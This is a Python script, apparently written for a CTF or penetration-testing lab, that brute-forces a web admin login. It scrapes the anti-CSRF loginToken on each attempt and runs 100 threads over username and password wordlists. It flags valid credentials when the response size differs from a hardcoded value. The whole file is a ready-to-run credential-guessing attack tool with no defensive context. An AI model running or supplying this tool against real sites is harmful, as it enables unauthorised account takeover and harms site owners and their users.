#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import threading
import sys
from time import sleep


def load_wordlist(wordlist, t):
	passwords = []
	slices = [] 
	with open(wordlist, 'rb') as f:
		while 1:
			line = f.readline()
			if len(line) < 1:
				break
			try:
				word = line.decode('ascii').strip()
			except:
				pass
			passwords.append(word)
	total = len(passwords) 
	batch_size = int(total / t)
	start = 0
	end = batch_size
	c = 0 
	while c < t - 1:
		slices.append(tuple(passwords[start:end]))
		start = end 
		end += batch_size
		c += 1
	end = total 
	slices.append(tuple(passwords[start:end]))
	del(passwords)
	return slices


def csrf_brute(url_root, url, size_filter, username, password):
	session = requests.Session()
	session.get(url_root)
	try:
		res = session.get(url)
	except:
		return None
	if res is None:
		return None
	html_parser = BeautifulSoup(res.text, 'html.parser')
	loginToken = str(html_parser.select('input')[2]).split()[3].split('=')[1].split('"')[1]
	data = {'username': username,'password': password, 'loginToken': loginToken}
	try:
		res = session.post(url, data=data, verify=False)
	except:
		return None
	if res is None:
		return None
	size = len(res.content)
	status = res.status_code
	if status == 200 and size != size_filter:
		print(f'\n\nFound Valid Creds!!! {username}:{password}\n\n')


def csrf_wrapper(url_root, url, size_filter, username, passwords):
	for password in passwords:
		csrf_brute(url_root, url, size_filter, username, password) 
			

def start_workers(proto, ip, path, wordlist, username, size_filter, t=100):
	url_root = f'{proto}://{ip}/'
	url = f'{proto}://{ip}{path}'
	threads = []
	slices = load_wordlist(wordlist, t)
	print(f'Running:  {str(len(slices))} workers for user {username}')
	for s in slices:
		threads.append(threading.Thread(target=csrf_wrapper, args=(url_root, url, size_filter, username, s,)))
	for thread in threads:
		thread.daemon = True
		thread.start()
	for thread in threads:
		thread.join()


def usage():
	print(f'Usage: csrf_brute http://xx.xx.xxx.xxx/admin/login')
	sys.exit(1)


if __name__ == '__main__':
	args = sys.argv[:]
	if len(args) != 2:
		usage()
		sys.exit(1)
	link = args[1]
	proto = link.split(':')[0]
	ip = link.split(':')[1].split('/')[2]
	path = '/' + '/'.join(link.split(':')[1].split('/')[3:])
	usernames = 'usernames.txt'
	wordlist = 'passwords.txt'
	size_filter = 4287
	with open(usernames, 'rb') as f:
		while 1:
			line = f.readline()
			if len(line) < 1:
				break
			try:
				username = line.decode('ascii').strip()
			except:
				pass
			start_workers(proto, ip, path, wordlist, username, size_filter)
